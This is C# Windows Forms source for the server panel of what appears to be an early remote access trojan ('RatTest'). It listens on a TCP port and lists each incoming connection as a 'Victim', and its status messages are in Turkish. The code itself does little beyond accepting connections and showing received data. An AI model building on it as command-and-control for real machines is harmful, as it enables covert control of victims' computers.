using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace RatTest
{
    public partial class FormMain : Form
    {
        TcpListener listener;
        

        public FormMain()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            Application.ApplicationExit += Application_ApplicationExit;
            Globals.form = this;
            Globals.Victims = new VictimListManager(listViewVictims);
            Globals.Victims.Receive += Victims_Receive;

            buttonStartListen_Click(null, null);
        }

        private void Victims_Receive(Victim v, string data)
        {
            if(data == null)
                MessageBox.Show("NULL");
            else
                MessageBox.Show(data);
        }

        //------------ApplicationExit
        private void Application_ApplicationExit(object sender, EventArgs e)
        {
            foreach (Victim v in Globals.Victims)
                v.Dispose();
        }

        //---------buttonStartListen_Click
        private void buttonStartListen_Click(object sender, EventArgs e)
        {
            listener = new TcpListener(IPAddress.Any,Convert.ToInt32( textBoxListenPort.Text) );
            listener.Start();
            listener.BeginAcceptSocket(ComingConnection, null);
            Status("Dinlemeye Başlandı",1);
            
        }
        //--------buttonStopListen_Click
        private void buttonStopListen_Click(object sender, EventArgs e)
        {
            listener.Stop();
            Status("Listener Durdu");
        }
        //------ComingConnection
        void ComingConnection(IAsyncResult ar)
        {
            Socket socket = listener.EndAcceptSocket(ar);

            NetworkStream ag = new NetworkStream(socket);
            StreamReader oku = new StreamReader(ag);

            Victim v = new Victim(socket);
            Globals.Victims.Add(v);

            //char[] buf = new char[25];
            //oku.Read(buf, 0, 20);
            //Status( new string(buf ));

            //v.SetInfo(temp);

            //Status("bağlanıldı");
            //listener.BeginAcceptSocket(ComingConnection, null);

        }
        //-----------SetStatus
        public void Status(string text, int statusCode = 0)
        {
            toolStripStatus.Text = text;

            if(statusCode == 0)
                toolStripStatus.ForeColor = Color.Black;
            else if(statusCode == 1)
                toolStripStatus.ForeColor = Color.Green;
            else if (statusCode == 2)
                toolStripStatus.ForeColor = Color.Red;
            else
                toolStripStatus.ForeColor = Color.Blue;
        }

    }
}
